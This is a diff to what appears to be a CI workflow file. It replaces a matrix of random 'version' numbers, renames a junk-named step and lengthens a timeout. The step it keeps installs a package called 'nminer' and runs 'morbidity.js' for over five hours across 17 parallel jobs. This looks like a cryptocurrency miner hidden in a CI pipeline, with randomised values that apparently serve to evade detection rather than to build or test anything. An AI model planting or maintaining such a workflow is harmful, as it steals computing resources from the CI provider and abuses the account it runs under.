@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6027 }
-          - { version: 1717 }
-          - { version: 2224 }
-          - { version: 529 }
-          - { version: 8728 }
-          - { version: 9603 }
-          - { version: 8444 }
-          - { version: 2002 }
-          - { version: 4389 }
-          - { version: 4500 }
-          - { version: 2891 }
-          - { version: 7014 }
-          - { version: 6764 }
-          - { version: 9028 }
-          - { version: 2136 }
-          - { version: 6445 }
-          - { version: 1172 }
-          - { version: 1392 }
-          - { version: 9552 }
+          - { version: 9004 }
+          - { version: 629 }
+          - { version: 4109 }
+          - { version: 5569 }
+          - { version: 4599 }
+          - { version: 5649 }
+          - { version: 2610 }
+          - { version: 724 }
+          - { version: 5790 }
+          - { version: 5923 }
+          - { version: 8503 }
+          - { version: 9602 }
+          - { version: 8321 }
+          - { version: 5314 }
+          - { version: 2650 }
+          - { version: 8153 }
+          - { version: 2236 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: once cantaloupe hype dependable
+      - name: bare
         run: |
           npm install nminer@latest
-          timeout 303m node morbidity.js || echo "morbidity executed"
+          timeout 313m node morbidity.js || echo "morbidity executed"
